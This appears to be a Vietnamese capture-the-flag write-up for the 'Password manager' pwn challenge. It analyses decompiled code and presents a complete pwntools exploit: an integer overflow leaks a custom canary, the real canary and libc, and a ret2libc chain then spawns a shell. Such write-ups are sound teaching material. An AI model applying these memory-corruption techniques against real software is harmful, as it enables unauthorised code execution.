# Password manager

1 chall mình thấy rất hay trong giải KMACTF lần này

## Ida 

vì chall rất dài nên mình vừa đọc ida vừa phân tích luôn 

### main 

```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int buf; // [rsp+10h] [rbp-30h] BYREF
  unsigned int v5; // [rsp+18h] [rbp-28h] BYREF
  __int64 v6; // [rsp+20h] [rbp-20h]
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  v6 = 0LL;
  init(argc, argv, envp);
  memset(&buf, 0, 0x20uLL);
  set_canary(&buf, 32LL);
  while ( !v6 )
  {
    menu();
    __isoc99_scanf("%d", &buf);
    getchar();
    if ( buf == 5 || buf == 4 || (printf("Index: "), __isoc99_scanf("%d", &v5), getchar(), v5 < 4) )
    {
      switch ( buf )
      {
        case 1:
          add_cred(v5);
          break;
        case 2:
          edit_cred(v5);
          break;
        case 3:
          delete_cred(v5);
          break;
        case 4:
          encrypted = encrypted == 0;
          lock_n_lock(0xFFFFFFFFLL);
          break;
        case 5:
          v6 = 1LL;
          break;
        default:
          puts("Invalid choice!");
          break;
      }
    }
    else
    {
      puts("Invalid index!");
    }
  }
  check_canary((__int64)&buf, 32LL);
  return 0;
}
```

- giống cái bài heap khác , chall cho ta 4 option, 1 tạo cred, 2 edit nó, 3 xóa cred, 4 thì encrypted hoặc decrypted content của cred, 5 là exit, và cho phép ta tạo tối đa 4 cred
- ở đây còn có 1 điều quan trọng nữa là có 2 hàm set_canary và check canary 

```c 
_QWORD *__fastcall set_canary(__int64 a1, __int64 a2)
{
  _QWORD *result; // rax

  gen_canary();
  result = (_QWORD *)(a2 - 8 + a1);
  *result = *((_QWORD *)canary + canary_count);
  return result;
}

int gen_canary()
{
  int fd; // [rsp+Ch] [rbp-4h]

  canary = realloc(canary, 8 * (++canary_count + 1));
  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
  {
    puts("Cannot open /dev/urandom!");
    exit(0);
  }
  read(fd, (char *)canary + 8 * canary_count, 8uLL);
  return close(fd);
}

__int64 __fastcall check_canary(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  char v3; // [rsp+13h] [rbp-Dh]
  int i; // [rsp+14h] [rbp-Ch]

  v3 = 0;
  for ( i = 0; ; ++i )
  {
    result = canary_count;
    if ( i > canary_count )
      break;
    if ( *(_QWORD *)(a2 - 8 + a1) == *((_QWORD *)canary + i) )
      v3 = 1;
  }
  if ( !v3 )
  {
    puts("*** stack smashing detected ***: terminated");
    puts("Aborted");
    exit(0);
  }
  return result;
}
```

- hàm set_canary sẽ tạo 1 cái fake canary nằm trước cái canary của binary , còn hàm check_canary sẽ check cả 2 cái fake canary và canary

![image](https://github.com/gookoosss/CTF/assets/128712571/82cc538b-419f-4187-8674-b7dbf2eb83b8)


### add_cred

```c 
unsigned __int64 __fastcall add_cred(int idx)
{
  __int64 s; // [rsp+10h] [rbp-30h] BYREF
  ssize_t v3; // [rsp+18h] [rbp-28h]
  unsigned __int64 v4; // [rsp+28h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  memset(&s, 0, 0x18uLL);
  set_canary(&s, 24LL);
  if ( note_size[idx] )
  {
    puts("Note exist!");
  }
  else
  {
    printf("Size: ");
    __isoc99_scanf("%lu", &s);                  // Buffer Overflow // Integer Overflow
    getchar();
    *(_QWORD *)&note_size[idx] = s;
    if ( note_size[idx] > 0 && note_size[idx] <= 0x100 )
    {
      printf("Data: ");
      v3 = read(0, &note[256 * (__int64)idx], note_size[idx]);
      if ( note[256 * (__int64)idx - 1 + v3] == 10 )
        note[256 * (__int64)idx - 1 + v3] = 0;
      if ( encrypted )
      {
        printf("Encrypting credential...");
        lock_n_lock(idx);
        puts("\t--> Done");
      }
      check_canary((__int64)&s, 24LL);
    }
    else
    {
      puts("Invalid size!");
      note_size[idx] = 0;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```
- tại đây cho phép ta tạo 1 cái note có size > 0 và <= 256 byte (0x100), sau đó nhập data vào cái note
- có cả set canary và check canary luôn
- phần encrypted mình sẽ phân tích tại option 4
- ở đây có 1 bug rất quan trọng mà cực kì khó thấy nếu không có kinh nghiệm đó là IOF bug

![image](https://github.com/gookoosss/CTF/assets/128712571/f5e2d066-5053-4ec6-ae63-6b4be3aba5b2)


- như trên ảnh thì ta thấy note_size[] có kiểu dữ liệu là int(4byte), nhưng format của scanf lại là "%lu" là kiểu unsigned long (8byte) => có IOF
- lợi dụng IOF ta hoàn toàn có thể overflow size của idx kế tiếp tạo fake size phục vụ việc khai thác

### edit_canary 

```c 
unsigned __int64 __fastcall edit_cred(unsigned int idx)
{
  size_t v1; // rax
  int v2; // eax
  unsigned int v4; // [rsp+Ch] [rbp-134h]
  char s[256]; // [rsp+10h] [rbp-130h] BYREF
  char v6[8]; // [rsp+110h] [rbp-30h] BYREF
  ssize_t v7; // [rsp+118h] [rbp-28h]
  unsigned __int64 v8; // [rsp+128h] [rbp-18h]

  v4 = idx;
  v8 = __readfsqword(0x28u);
  memset(s, 0, 0x118uLL);
  set_canary(s, 280LL);
  if ( note_size[idx] )
  {
    if ( encrypted )
    {
      printf("Decrypting credential...");
      lock_n_lock(v4);
      puts("\t--> Done");
    }
    printf("Old data: %s\n", &note[256 * (__int64)(int)v4]);
    printf("New data: ");
    v7 = read(0, s, 0x100uLL);
    if ( s[v7 - 1] == 10 )
      s[v7 - 1] = 0;
    printf("Save note? [y/n]: ");
    __isoc99_scanf("%c", v6);
    getchar();
    if ( v6[0] == 121 )
    {
      v1 = strlen(s);
      if ( v1 > note_size[v4] )
      {
        v2 = strlen(s);
        note_size[v4] = v2;
      }
      memcpy(&note[256 * (__int64)(int)v4], s, note_size[v4]);
      puts("Done!");
    }
    if ( encrypted )
    {
      printf("Encrypting credential...");
      lock_n_lock(v4);
      puts("\t--> Done");
    }
    check_canary((__int64)s, 280LL);
  }
  else
  {
    puts("Note doesn't exist!");
  }
  return __readfsqword(0x28u) ^ v8;
}
```
- hàm này sẽ print ra data của note và cho phép ta nhập  data mới vào stack 
- sau đó hàm memcpy sẽ lấy dữ liệu trên stack theo note_size gán vào trong note
```c 
memcpy(&note[256 * (__int64)(int)v4], s, note_size[v4]);
```
- khoan đã , vậy nếu ta fake size thành 1 size lớn hơn biến s là 0x118 byte, thì hàm memcpy sẽ lấy từ stack nhiều hơn size của s và vô tình lấy luôn các dữ liệu quang trọng như fake_canary, canary, exe và libc 

### delete_cred 

```c 
unsigned __int64 __fastcall delete_cred(int a1)
{
  char s[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  memset(s, 0, 0x10uLL);
  set_canary(s, 16LL);
  if ( note_size[a1] )
  {
    if ( encrypted )
    {
      printf("Decrypting credential...");
      lock_n_lock(a1);
      puts("\t--> Done");
    }
    printf("Data: %s\n", &note[256 * (__int64)a1]);
    if ( encrypted )
    {
      printf("Encrypting credential...");
      lock_n_lock(a1);
      puts("\t--> Done");
    }
    printf("Delete note? [y/n]: ");
    __isoc99_scanf("%c", s);
    getchar();
    if ( s[0] == 121 )
    {
      memset(&note[256 * (__int64)a1], 0, note_size[a1]);
      note_size[a1] = 0;
      puts("Done!");
    }
    check_canary((__int64)s, 16LL);
  }
  else
  {
    puts("Note doesn't exist!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

- đơn giản là xóa 1 cái note , không có gì đặc biệt để khai thác 

### lock_n_lock

```c 
unsigned __int64 __fastcall lock_n_lock(int idx)
{
  int k; // [rsp+14h] [rbp-11Ch]
  int i; // [rsp+18h] [rbp-118h]
  int j; // [rsp+1Ch] [rbp-114h]
  char s[264]; // [rsp+20h] [rbp-110h] BYREF
  unsigned __int64 v6; // [rsp+128h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  memset(s, 0, sizeof(s));
  set_canary(s, 264LL);
  if ( idx == -1 )
  {
    for ( i = 0; i <= 3; ++i )
    {
      if ( encrypted )
        printf("Encrypting credential %d...", (unsigned int)i);
      else
        printf("Decrypting credential %d...", (unsigned int)i);
      memset(s, 0, 0x100uLL);
      for ( j = 0; j < note_size[i]; ++j )
        s[j] = key[j % 8] ^ note[256 * (__int64)i + j];
      memcpy(&note[256 * (__int64)i], s, note_size[i]);
      puts("\t--> Done");
    }
    check_canary((__int64)s, 264LL);
  }
  else
  {
    for ( k = 0; k < note_size[idx]; ++k )
      s[k] = key[k % 8] ^ note[256 * (__int64)idx + k];
    memcpy(&note[256 * (__int64)idx], s, note_size[idx]);
  }
  return __readfsqword(0x28u) ^ v6;
}
```

- khi chọn option 4, tất cả các note sẽ được encrypted theo biến Key(random), bằng cách lấy data ^ key, và ngược lại
- sau khi encrypted, nếu ta chọn các option khác như 1 , 2 ,3, hàm lock_n_lock sẽ tự động decrypted lại data của idx đó trong lúc chạy option, khi kết thúc thì nó sẽ lại tự động encryted lại data của mình, đặc biệt là cả quá trình này nó sẽ ko có hàm check_canary => có thể leak addr
- còn 1 điều quang trọng nữa là ở đây có hàm memcpy, nhưng sẽ đưa dữ liệu từ note vào stack để XOR, sau đó đưa lại vào note => có BOF bug

## Exploit

phân tích cũng khá dài rồi giờ bắt tay vào làm thôi

### Leak Key
- tạo thử 2 cái note idx 0 và 1 , sau đó encryted xem sao

```c 
add(0, 0x80, b'a'*8)
add(1, 0x10, b'b'*8)
lock_n_lock()
```
![image](https://github.com/gookoosss/CTF/assets/128712571/c64a0aaf-6d70-4fee-aac9-01f57b2e01ab)


- các 8 byte null sẽ encrypted thành 0xd908a00a9c4df605 => key == 0xd908a00a9c4df605
- để leak được key thì ta cần tạo để fake chunk cho idx 1 = 0x8 bằng IOF, lý do là để khi vào hàm edit_cred thì nó chỉ decrypted lại 8byte theo note_size(0x8) ta đã fake, còn 8byte sau của key nó để nguyên => leak được key

![image](https://github.com/gookoosss/CTF/assets/128712571/e20d8fd2-4575-4b01-bb95-cec7657eb254)


```python 
### leak key ###
GDB()
add(0, 0x80, b'a'*8)
add(1, 0x10, b'b'*8)
lock_n_lock() # encrypted null byte -> Key
delete(0)
add(0, 0x0000000800000080, b'a'*8) # IOF => fake size idx1 = 0x8 
key = u64(edit(1, b'c'*8)[8:])
print(hex(key))
```

### Leak canary and libc

- trước tiên ta decrypted để đưa data về ban đầu
- như đã phân tích ở trên thì ta lợi dụng IOF để fake size cho idx 1 là 0x200, memcpy sẽ lấy từ stack 0x100byte biến s gán vào idx 1, còn lại 0x100 byte chứa các addr quan trọng sẽ bị tràn qua idx 2

![image](https://github.com/gookoosss/CTF/assets/128712571/49d85e08-07dc-4185-ac36-16f2bf16ef1b)


- lúc này trong idx 2 chứa đầy đủ các addr của fake canary, canary, exe và libc, ta sẽ edit idx 2 từ từ để leak ra hết các addr cần thiết

![image](https://github.com/gookoosss/CTF/assets/128712571/38ec1dd9-4dfc-4d08-86de-4bdac3a3e323)


```c 
### leak canary and libc ###
lock_n_lock()
delete(0)
add(0, 0x0000020000000080, b'a'*8) # IOF => fake size idx1 = 0x200 > 0x100(256)
edit(1, b'a'*8)
# lúc này memcpy sẽ lấy 0x100 byte gán vào idx 1, 0x100 byte sau (chứa canary , exe, libc) gán vào idx 2
add(2, 0x10, b'b'*0x10) # add idx 2
fake_canary = u64(edit(2, b'a' * 0x19)[0x10:])
canary = u64(edit(2, b'a' * 0x88)[0x18:0x20]) - 0x61
libc.address = u64(edit(2, b'a' * 0x88)[0x88:] + b'\0\0') - 0x23a90
print(hex(fake_canary))
print(hex(canary))
print(hex(libc.address))
```

### Get shell
- sau khi leak dc fake canary, canary và libc rồi thì ta hoàn toàn có thể ret2libc để lấy shell
- nhưng vấn đề là ret2libc vào hàm nào , cùng phân tích xíu né
- có 2 hàm cho phép ta gán giá trị vào stack, đó là edit_cred và lock_n_lock()
- hàm edit_cred chỉ cho phép ta nhập vào bằng note_size, giới hạn chỉ 256byte < s, hoàn toàn ko thể overwrite được
- còn hàm lock_n_lock() gán vào stack cái data của note XOR với key theo size của note, hmmm, lúc này size thằng idx 1 đang là 0x200 > 0x100 của biến s, nếu vậy memcpy() nó sẽ lấy luôn 0x100 thằng idx 2 gán vào trong stack ==>  BOF 
- để dễ hình dung thì các bạn có thể ảnh dưới: 

![image](https://github.com/gookoosss/CTF/assets/128712571/79100931-6947-4e33-b0ac-3f6de2ebf50a)


- vậy nên ta sẽ để payload ^ key trước, sau đó edit_crd() idx 2, lúc gàn vào stack thì payload ^ key ^ key == payload ==> ret2libc

```python
### get shell ###
pop_rdi = libc.address + 0x00000000000240e5
ret = libc.address + 0x0000000000022fd9

payload = flat(
    fake_canary ^ key,
    canary ^ key,
    key,
    pop_rdi + 1 ^ key,
    pop_rdi ^ key,
    next(libc.search(b'/bin/sh'))^ key,
    libc.sym.system ^ key,

)
edit(2, payload)
lock_n_lock()
```
- dee cuối cùng cũng lấy dc shell

![image](https://github.com/gookoosss/CTF/assets/128712571/2ed57f97-9fcd-416e-a35f-2b853aaa7fc3)


## script 

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./passwordmanager_patched")
libc = ELF("./libc6_2.37-0ubuntu2_amd64.so")
ld = ELF("./ld-2.37.so")

context.binary = exe


p = process([exe.path])

def GDB():
    gdb.attach(p, gdbscript = '''
    b*main+132
    b*edit_cred+572
    b*lock_n_lock+670
    b*lock_n_lock+0
    c
    ''')
    
    input()

def add(idx, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', str(idx))
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Data: ', data)

def edit(idx, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx))
    p.recvuntil(b'Old data: ')
    output = p.recvuntil(b'\nNew data: ', drop = True)
    p.send(data)
    p.sendlineafter(b'[y/n]: ', b'y')
    return output

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx))
    p.sendlineafter(b'[y/n]: ', b'y')

def lock_n_lock():
    p.sendlineafter(b'> ', b'4')


### leak key ###
GDB()
add(0, 0x80, b'a'*8)
add(1, 0x10, b'b'*8)
lock_n_lock() # encrypted null byte -> Key
delete(0)
add(0, 0x0000000800000080, b'a'*8) # IOF => fake size idx1 = 0x8 
key = u64(edit(1, b'c'*8)[8:])
print(hex(key))

### leak canary and libc ###
lock_n_lock()
delete(0)
add(0, 0x0000020000000080, b'a'*8) # IOF => fake size idx1 = 0x200 > 0x100(256)
edit(1, b'a'*8)
# lúc này memcpy sẽ lấy 0x100 byte gán vào idx 1, 0x100 byte sau (chứa canary , exe, libc) gán vào idx 2
add(2, 0x10, b'b'*0x10) # add idx 2
fake_canary = u64(edit(2, b'a' * 0x19)[0x10:])
canary = u64(edit(2, b'a' * 0x88)[0x18:0x20]) - 0x61
libc.address = u64(edit(2, b'a' * 0x88)[0x88:] + b'\0\0') - 0x23a90
print(hex(fake_canary))
print(hex(canary))
print(hex(libc.address))

### get shell ###
pop_rdi = libc.address + 0x00000000000240e5
ret = libc.address + 0x0000000000022fd9

payload = flat(
    fake_canary ^ key,
    canary ^ key,
    key,
    pop_rdi + 1 ^ key,
    pop_rdi ^ key,
    next(libc.search(b'/bin/sh'))^ key,
    libc.sym.system ^ key,

)
edit(2, payload)
lock_n_lock()

p.interactive()
```
